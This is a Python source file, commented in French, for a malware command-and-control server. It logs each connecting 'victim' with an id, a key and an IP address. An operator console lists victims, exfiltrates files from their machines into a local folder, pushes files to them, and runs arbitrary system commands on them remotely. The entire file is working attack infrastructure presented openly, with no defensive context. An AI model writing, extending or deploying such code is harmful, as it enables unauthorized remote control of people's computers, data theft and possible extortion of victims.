import socket, json, threading, os, time

IP_BIND, PORT = "0.0.0.0", 5000
DB_FILE, STORAGE_DIR = "victims.json", "./exfiltrated_files"
if not os.path.exists(STORAGE_DIR): os.makedirs(STORAGE_DIR)
active_clients = {}

def save_to_db(uuid, key, addr):
    db = {}
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: db = json.load(f)
        except: db = {}
    db[uuid] = {"key": key, "ip": addr, "date": time.strftime('%Y-%m-%d %H:%M:%S')}
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)

def handle_client(conn, addr):
    try:
        data = conn.recv(4096).decode('utf-8')
        if not data: return
        info = json.loads(data)
        v_id = info.get('id')
        active_clients[v_id] = conn
        save_to_db(v_id, info.get('key'), addr[0])
        print(f"\n[!] VICTIME CONNECTÉE : {v_id}")
    except: pass

def server_console():
    while True:
        choice = input("\nC2-ADMIN > ").strip().split(" ")
        cmd = choice[0]
        if cmd == "list": print(list(active_clients.keys()))
        elif cmd == "upload" and len(choice) >= 3:
            v_id, remote_path = choice[1], choice[2]
            if v_id in active_clients:
                active_clients[v_id].send(f"UPLOAD|{remote_path}".encode())
                res = active_clients[v_id].recv(4096).decode()
                if res.startswith("OK|"):
                    filesize, filename = int(res.split("|")[1]), os.path.basename(remote_path)
                    received = 0
                    with open(os.path.join(STORAGE_DIR, f"{v_id}_{filename}"), "wb") as f:
                        while received < filesize:
                            chunk = active_clients[v_id].recv(min(4096, filesize - received))
                            if not chunk: break
                            f.write(chunk)
                            received += len(chunk)
                    print(f"[OK] Fichier exfiltré ({received} octets).")
                else: print(f"[!] {res}")
        elif cmd == "download" and len(choice) >= 3:
            v_id, local_path = choice[1], choice[2]
            if v_id in active_clients and os.path.exists(local_path):
                filename, filesize = os.path.basename(local_path), os.path.getsize(local_path)
                active_clients[v_id].send(f"DOWNLOAD|{filename}|{filesize}".encode())
                time.sleep(0.5)
                with open(local_path, "rb") as f:
                    while True:
                        chunk = f.read(4096); 
                        if not chunk: break
                        active_clients[v_id].sendall(chunk)
                print(f"[OK] Envoi de {filename} terminé.")
        elif cmd == "exec" and len(choice) >= 3:
            v_id, sys_cmd = choice[1], " ".join(choice[2:])
            if v_id in active_clients:
                active_clients[v_id].send(f"EXEC|{sys_cmd}".encode())
                print(active_clients[v_id].recv(8192).decode())
        elif cmd == "exit": os._exit(0)

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((IP_BIND, PORT)); s.listen(10)
    threading.Thread(target=server_console, daemon=True).start()
    while True:
        c, a = s.accept()
        threading.Thread(target=handle_client, args=(c, a)).start()

if __name__ == "__main__": start_server()
